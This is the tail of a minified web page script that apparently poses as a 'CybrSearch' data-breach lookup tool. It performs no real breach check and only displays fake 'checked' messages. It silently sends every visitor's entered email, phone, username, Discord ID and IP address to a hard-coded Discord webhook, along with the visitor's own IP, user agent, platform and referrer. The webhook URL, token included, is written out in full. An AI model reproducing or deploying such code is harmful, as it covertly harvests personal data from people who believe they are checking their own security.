(),o=document.getElementById("ip").value.trim();if(!e)updateResult("email","âš ï¸ No email entered.","warning");else updateResult("email",`âœ… Email checked: ${e}`,"success");if(!t)updateResult("phone","â„¹ï¸ Phone check skipped.","warning");else updateResult("phone",`âœ… Phone checked: ${t}`,"success");if(!n)updateResult("username","â„¹ï¸ Username check skipped.","warning");else updateResult("username",`âœ… Username checked: ${n}`,"success");if(!a)updateResult("discord","â„¹ï¸ Discord ID check skipped.","warning");else updateResult("discord",`âœ… Discord ID checked: ${a}`,"success");let i="Unknown";try{const e=await fetch("https://api.ipify.org?format=json"),t=await e.json();i=t.ip||"Unknown"}catch(e){}await sendBreachWebhook({email:e,phone:t,username:n,discord:a,ip:o},i);if(o)try{const e=await fetch(`https://ipwho.is/${o}`),t=await e.json();t.success?updateResult("ipgeo",`ğŸŒ IP Geo Info:\nIP: ${o}\nCountry: ${t.country}\nCity: ${t.city}\nRegion: ${t.region}\nISP: ${t.connection?.isp||"N/A"}\nOrg: ${t.connection?.org||"N/A"}`,"success"):updateResult("ipgeo",`âš ï¸ Geo lookup failed: ${t.message}`,"warning")}catch(e){updateResult("ipgeo","âŒ Error fetching Geo IP data.","error")}else updateResult("ip","â„¹ï¸ IP geo-location check skipped.","warning")}function updateResult(e,t,n){const a=document.createElement("div");a.className=`result-box ${n}`,a.textContent=t,document.getElementById("results").appendChild(a)}async function sendBreachWebhook(e,t){const n={embeds:[{title:"ğŸ” Breach Search Attempt",color:3447003,fields:[{name:"ğŸ“§ Email",value:e.email||"Not provided"},{name:"ğŸ“± Phone",value:e.phone||"Not provided"},{name:"ğŸ‘¤ Username",value:e.username||"Not provided"},{name:"ğŸ’¬ Discord ID",value:e.discord||"Not provided"},{name:"ğŸŒ IP Entered",value:e.ip||"Not provided"},{name:"ğŸ“ Visitor IP",value:t||"Unknown"},{name:"ğŸ§  User Agent",value:navigator.userAgent},{name:"ğŸ’» Platform",value:navigator.platform},{name:"ğŸŒ Referrer",value:document.referrer||"None"},{name:"ğŸ•’ Time (UTC)",value:new Date().toUTCString()}],footer:{text:"Breach Logger â€¢ CybrSearch"},timestamp:new Date().toISOString()}]};try{await fetch("https://discord.com/api/webhooks/1381748799340548247/j9hWnOzmqBwerSUrzI_-7YL2F_vLPMTXU3eFK2Ep0ZA8YPtjT37VvJbSNxETfc-XD3jl",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(n)})}catch(e){console.warn("âš ï¸ Failed to send webhook.")}}</script></body></html>
